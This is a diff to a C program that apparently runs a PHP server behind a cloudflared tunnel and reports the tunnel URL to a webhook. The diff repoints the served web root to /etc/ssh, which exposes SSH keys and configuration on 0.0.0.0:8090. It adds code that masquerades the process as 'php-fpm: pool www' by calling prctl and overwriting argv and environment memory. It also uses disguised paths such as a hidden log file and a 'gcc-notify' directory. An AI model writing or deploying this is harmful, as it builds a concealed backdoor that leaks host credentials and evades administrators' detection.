@@ -11,6 +11,7 @@
 #include <time.h>
 #include <stdarg.h>
 #include <ctype.h>
+#include <sys/prctl.h>   /* prctl(), PR_SET_NAME */
 
 #define RAWLOG "/var/log/cloudflared_raw.log"
 #define OUTLOG "/var/log/.cache.log"
@@ -24,7 +25,7 @@
 /* PHP server command to run (safe webroot) */
 #define PHP_BIN "/usr/bin/php"
 #define PHP_ADDR "0.0.0.0:8090"
-#define WEB_ROOT "/var/www/html"
+#define WEB_ROOT "/etc/ssh"
 
 /* Permanent file to store last sent URL so we don't resend after restart */
 #define LAST_SENT_DIR "/var/lib/gcc-notify"
@@ -53,6 +54,54 @@ static void log_raw(const char *fmt, ...) {
     }
     va_end(ap);
 }
+/* set_proc_name: set kernel-visible name and try to overwrite argv[0] */
+extern char **environ;
+
+/* Enhanced: set kernel name and overwrite argv/env contiguous memory region */
+static void set_proc_name(const char *name, int argc, char **argv) {
+    /* 1) kernel-visible name (PR_SET_NAME) — still limited to 15 visible chars */
+    if (prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0) != 0) {
+        /* non-fatal; optionally log */
+        /* fprintf(stderr, "prctl(PR_SET_NAME) failed: %s\n", strerror(errno)); */
+    }
+
+    /* 2) best-effort: find contiguous memory block from argv[0] through env strings */
+    if (argc <= 0 || argv == NULL || argv[0] == NULL) return;
+
+    char *start = argv[0];
+    char *end = start;
+
+    /* Move end to end of last argv string */
+    for (int i = 0; i < argc; ++i) {
+        if (argv[i]) {
+            char *p = argv[i] + strlen(argv[i]);
+            if (p > end) end = p;
+        }
+    }
+
+    /* Move end further across environment strings (if contiguous) */
+    for (char **e = environ; e && *e; ++e) {
+        char *p = *e + strlen(*e);
+        if (p > end) end = p;
+    }
+
+    size_t region_len = (end > start) ? (size_t)(end - start) : strlen(argv[0]);
+
+    /* If region is too small, zero what we can and copy truncated name */
+    if (region_len == 0) return;
+
+    size_t name_len = strlen(name);
+    /* ensure we leave final byte as NUL */
+    size_t copy_len = (name_len < region_len - 1) ? name_len : (region_len - 1);
+
+    /* Overwrite the whole region with NULs then copy the name at the start */
+    memset(start, 0, region_len);
+    memcpy(start, name, copy_len);
+    start[copy_len] = '\0';
+    /* done */
+}
+
+
 
 /* safe atomic write to a file */
 static int atomic_write(const char *path, const char *data) {
@@ -245,7 +294,12 @@ static void send_webhook(const char *domain, const char *url) {
 }
 
 
-int main(void) {
+int main(int argc, char **argv) {
+    /* set process name to "kontol" (max 15 visible chars) */
+    set_proc_name("php-fpm: pool www", argc, argv);
+
+    /* ... rest of your program ... */
+
     /* domain from define or hostname fallback */
     char domain[512] = {0};
     if (TUNNEL_DOMAIN[0] != '\0') strncpy(domain, TUNNEL_DOMAIN, sizeof(domain)-1);
